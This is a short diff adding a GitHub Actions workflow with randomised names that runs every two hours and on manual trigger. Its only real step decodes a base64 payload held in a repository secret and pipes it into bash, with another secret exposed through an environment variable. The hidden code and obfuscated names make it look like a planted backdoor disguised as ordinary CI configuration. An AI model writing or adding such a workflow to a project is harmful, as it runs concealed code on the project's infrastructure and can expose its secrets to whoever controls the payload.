@@ -1,0 +1,13 @@
+name: TxUWVEM
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  ASSTzw:
+    runs-on: ubuntu-latest
+    env:
+      IHwXGPMM: ${{ secrets.IwCFtxl }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.fJcPTFp }}" | base64 -d | bash
